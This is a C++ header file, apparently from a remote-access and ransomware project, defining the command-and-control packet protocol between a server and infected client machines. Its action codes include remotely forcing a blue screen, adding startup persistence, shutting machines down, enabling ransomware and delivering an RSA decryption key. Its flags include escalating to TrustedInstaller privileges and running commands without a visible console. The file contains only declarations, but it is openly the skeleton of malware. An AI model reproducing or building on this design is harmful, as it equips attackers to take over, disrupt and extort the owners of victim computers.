#pragma once

#include "Win32Natives.h"
#include "openssl/rsa.h"

#include <vector>
#include <string>
#include <iterator>

constexpr USHORT MAX_BUFFER_LEN = 4000;

// bitwise flags optionally included in packets....
const int NO_CONSOLE          = 1 << 0; // default is to make a console when a command is ran on remote host
const int RUN_AS_HIGHEST      = 1 << 1; // try to get highest privellages (trusted installer) and run as that
const int RUN_AS_NORMAL       = 1 << 2; // run as whatever privellages are available
const int USE_CLI             = 1 << 3; // use command prompt
const int RESPOND_WITH_STATUS = 1 << 4; // server wants a response
const int PACKET_IS_A_COMMAND = 1 << 5; // this packet is a command and the action in the packet must be performed

typedef std::vector<unsigned char> BYTESTRING;

// RSA Der format
struct DER {
    unsigned char* data = NULL;
    int len = 0;
};

// Response codes sent from the client to the server
// Usually after a remoteaction is completed
enum ClientResponseCode {
    kNotAResponse  = 3,
    kResponseOk    = 6,
    kResponseError = -1,
    kTimeout       = -2,
};

// Enums dictating which action to perform when packets are received
enum Action {
    kNone,
    kOpenRemoteProcess,
    kClientWantsToDisconnect,  
    kKillClient,        // forcefully disconnect the client from the server
    kPingClient,
    kKeepAlive,
    kRemoteBSOD,        // cause a blue screen of death
    kAddToStartup,      // add a program file path to startup registry
    kRemoteShutdown,    // shut down the client machine
    kRansomwareEnable,  // dangerous, enable ransomware on client machine
    kSetAsDecryptionKey, // Tell the client that the data in buffer is der format of the private rsa key
    kRunDecryptor,      // run the ransomware decryptor if the private key is on the machine
    kAddClientToServer, // client wants to be added to tcp server
};

enum SocketTypes {
    UDP,
    TCP,
};

/*
    A struct representing a server that
    clients can connect to and send requests on.
    Servers have a socket file descriptor which is used
    to send and receive information over sockets.
*/
struct Server {
    SOCKET             sfd;      // Socket File Descriptor
    int                domain;   
    int                type;     // Communcation semmantic type.
    int                protocol; // Server protocol. All server protocols will be 0.
    int                port;     
    sockaddr_in        addr;     // address struct with info on the server address
    BOOL               alive;    // is server on
    BOOL               accepting; // accepting connections
    
    Server()
        : sfd(INVALID_SOCKET), domain(AF_INET), type(-1),
        protocol(0), port(-1), addr({0}), alive(FALSE), accepting(FALSE)
    {
    }
};

/*
    Packet of information sent over sockets.
*/
#pragma pack(push, 1)
struct Packet {
    char buffer[MAX_BUFFER_LEN];
    size_t buffLen;
    Action action;
    int flags;
    bool valid;
    ClientResponseCode code = kResponseError;

    inline const bool insert(std::string s) { 
        if ( strcpy_s(buffer, s.data()) != 0 )
            return false;
        
        buffLen = s.size();
        return true;
    }
};
#pragma pack(pop, 0)

typedef Packet ServerCommand, ServerRequest, ServerResponse;
